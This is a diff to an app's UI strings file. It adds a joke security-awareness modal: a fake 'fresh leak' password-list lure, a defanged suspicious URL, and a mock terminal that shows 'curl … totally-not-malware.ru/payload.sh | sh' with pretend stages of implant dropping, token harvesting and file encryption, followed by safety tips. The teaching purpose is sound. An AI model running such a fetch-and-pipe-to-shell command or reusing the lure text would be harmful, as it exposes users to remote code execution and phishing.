@@ -67,5 +67,27 @@
     "copied": "Copied",
     "loading": "Loading…",
     "error": "Error"
+  },
+  "joke": {
+    "footerPrompt": "Special offer:",
+    "linkLabel": "free SOC-verified password list (10M, fresh leak)",
+    "hoverHint": "hxxps://10[.]0[.]0[.]13[.]suspicious-cdn[.]xyz/free-btc/index.html",
+    "modalTitle": "session.sh — payload.sh",
+    "closeLabel": "noted, I'll behave",
+    "lines": [
+      "$ curl -s https://totally-not-malware.ru/payload.sh | sh",
+      "",
+      "[+] stage 1 — dropping implant ............ ok",
+      "[+] stage 2 — harvesting browser tokens .. ok",
+      "[+] stage 3 — encrypting $HOME ............ j/k",
+      "",
+      "gotcha. you just clicked a stranger's link.",
+      "in the real world you'd already be exfiltrated.",
+      "",
+      "lesson:",
+      "  · hover first — read the actual URL",
+      "  · sandbox the unknown",
+      "  · trust no link, no attachment, no QR code"
+    ]
   }
 }
